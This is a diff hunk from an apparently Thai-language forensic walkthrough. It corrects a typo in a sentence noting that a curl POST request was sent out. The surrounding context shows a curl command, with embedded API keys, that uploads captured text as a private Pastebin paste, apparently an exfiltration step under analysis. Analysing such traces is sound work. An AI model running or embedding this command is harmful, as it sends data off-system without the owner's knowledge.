@@ -50,7 +50,7 @@ Step 3 DNS
 ```
 curl -d "api_user_key=ed67c1aec48d47270dd002d0baa29814&api_dev_key=bb8aa307a7d4b6073976149b65977bae&api_paste_private=2&api_option=paste&api_paste_code=${pastetext}" 'https://pastebin.com/api/api_post.php
 ```
-ถ้้าเราดูจากที่นี่จะสังเกตเห็นว่ามีคำขอ curl ถูกส่งออกไป และดูเหมือนว่าจะถูกส่งเป็นคำขอ POST 
+ถ้าเราดูจากที่นี่จะสังเกตเห็นว่ามีคำขอ curl ถูกส่งออกไป และดูเหมือนว่าจะถูกส่งเป็นคำขอ POST
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8792cab7-636b-40e4-894d-b19bcaa6561b" />
 
